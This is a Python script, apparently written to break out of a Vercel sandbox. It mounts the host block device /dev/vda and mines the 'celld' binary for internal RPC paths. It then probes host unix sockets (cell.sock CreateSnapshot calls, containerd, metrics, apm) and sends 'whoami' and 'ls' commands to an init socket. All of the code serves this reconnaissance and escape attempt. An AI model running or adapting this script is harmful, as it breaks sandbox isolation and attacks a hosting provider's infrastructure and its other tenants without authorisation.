# -*- coding: utf-8 -*-
"""vda5_cell_rpc: strings celld 挖 RPC 路径 + 各 sock 探测 (containerd/metrics/apm/init)
1) celld 二进制信息 (大小/类型) + strings 提取 hive 服务路径
2) cell.sock: 用挖出的路径重测 CreateSnapshot 系列
3) metrics.sock / apm.sock / containerd.sock / init.sock 探测
输出落盘 + 哨兵 V5R_DONE"""
import os, time, socket, ctypes, subprocess, re

OUT = '/vercel/sandbox/v5r.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def rpc_tcp(port, path, body='{}', t=4, host='127.0.0.1'):
    try:
        s = socket.create_connection((host, port), 3)
        s.settimeout(t)
        req = ('POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, host, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    # P0: mount
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    # P1: celld 二进制 strings 挖路径
    log('=== P1 celld strings ===')
    try:
        st = os.stat('/mnt/vdax/opt/vercel/celld')
        log('celld size=%d mode=%o' % (st.st_size, st.st_mode))
    except Exception as e:
        log('celld stat ERR %s' % e)
    try:
        p = subprocess.run(['strings', '/mnt/vdax/opt/vercel/celld'], capture_output=True, timeout=60)
        txt = p.stdout.decode(errors='replace')
        log('strings lines=%d' % len(txt.splitlines()))
        pats = re.findall(r'vercel\.hive\.[A-Za-z0-9_.]+', txt)
        uniq = sorted(set(pats))
        log('hive paths (%d): %s' % (len(uniq), uniq))
        # 所有 Service/ 方法模式
        m2 = re.findall(r'/[A-Za-z0-9_.]+Service/[A-Z][A-Za-z0-9]+', txt)
        uniq2 = sorted(set(m2))
        log('methods (%d): %s' % (len(uniq2), uniq2[:80]))
        # 关键词上下文
        for kw in ['CreateSnapshot', 'base_url', 'Snapshot', 'exec', 'Exec', 'shell']:
            idxs = [m.start() for m in re.finditer(kw, txt)][:3]
            for i in idxs:
                log('ctx %s: ...%s...' % (kw, txt[max(0, i - 80):i + 120].replace('\n', ' ')))
    except Exception as e:
        log('strings ERR %s' % e)

    # P2: 用挖出的路径重测 CreateSnapshot
    log('=== P2 CreateSnapshot 路径重测 ===')
    sp = '/mnt/vdax/run/cell/cell.sock'
    DID = 'a' * 32
    bodies = [
        ('{}', 'empty'),
        ('{"drive_id":"%s"}' % DID, 'drive_id'),
        ('{"drive_id":"%s","base_url":"http://127.0.0.1:18080/p"}' % DID, 'base_url'),
    ]
    for path in ['/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot',
                 '/vercel.hive.cell.api.drives.v2.DrivesService/CreateSnapshot',
                 '/vercel.hive.celld.api.v1.CelldService/CreateSnapshot']:
        for body, tag in bodies:
            st, bd = rpc_unix(sp, path, body, t=3)
            log('sock %s[%s] -> %s | %s' % (path.split('/')[-1], tag, st, bd[:150].replace('\n', ' ')))
            time.sleep(0.3)

    # P3: metrics.sock / apm.sock
    log('=== P3 metrics/apm sock ===')
    for sp2, paths in [
        ('/mnt/vdax/run/metrics/metrics.sock', ['/', '/metrics', '/-/healthy']),
        ('/mnt/vdax/run/apm/apm.sock', ['/', '/health', '/metrics']),
    ]:
        for path in paths:
            st, bd = rpc_unix(sp2, path, '{}', t=3)
            log('%s %s -> %s | %s' % (sp2.split('/')[-2], path, st, bd[:200].replace('\n', ' ')))
            time.sleep(0.3)

    # P4: containerd.sock (HTTP/1.1 探测 + grpc 探测)
    log('=== P4 containerd.sock ===')
    csp = '/mnt/vdax/run/containerd/containerd.sock'
    for path in ['/', '/v1/version', '/v3/version']:
        st, bd = rpc_unix(csp, path, '{}', t=3)
        log('ctr %s -> %s | %s' % (path, st, bd[:200].replace('\n', ' ')))
        time.sleep(0.3)
    # gRPC health (HTTP/2 preface + settings 帧探测是否 gRPC)
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(csp)
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        data = s.recv(1024)
        s.close()
        log('ctr h2 preface -> %r' % data[:100])
    except Exception as e:
        log('ctr h2 EXC %s' % e)

    # P5: init.sock (e150 协议: 命令 JSON over unix)
    log('=== P5 init.sock ===')
    isp = '/mnt/vdax/volumes/run/vercel/share/init.sock'
    try:
        st = os.stat(isp)
        log('init.sock mode=%o' % st.st_mode)
    except Exception as e:
        log('init.sock stat ERR %s' % e)
    for body in ['{"cmd":"whoami"}', '{"id":1,"cmd":"ls"}', 'ping\n', '{"cmd":"version"}']:
        st, bd = rpc_unix(isp, '/', body, t=3)
        log('init %r -> %s | %s' % (body[:30], st, bd[:200].replace('\n', ' ')))
        time.sleep(0.3)

    log('V5R_DONE')
    f.close()


if __name__ == '__main__':
    main()
